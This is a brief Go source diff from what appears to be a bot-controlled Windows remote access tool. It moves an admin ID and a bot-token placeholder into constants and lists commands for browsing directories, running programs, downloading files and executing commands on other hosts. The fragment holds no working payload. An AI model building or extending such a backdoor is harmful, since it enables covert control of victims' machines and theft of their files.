@@ -40,9 +40,10 @@ var (
 	procLocalFree   = dllkernel32.NewProc("LocalFree")
 )
 
-ADMIN_ID := 1234567 //123
-
-const HELP = "/pwd\n" +
+const(
+	ADMIN_ID = 123456 //change this
+	BOT_TOKEN = "<TOKEN>" //and this
+	HELP = "/pwd\n" +
 	"/ls <directory>\n" +
 	"/cd <directory>\n" +
 	"/run <path>\n" +
@@ -53,3 +54,4 @@ const HELP = "/pwd\n" +
 		"/dl <path to file>\n" +
 	"/to <hostname/ip> <command>" +
 	"simply send me file with text \"exec\" to execute it"
+)
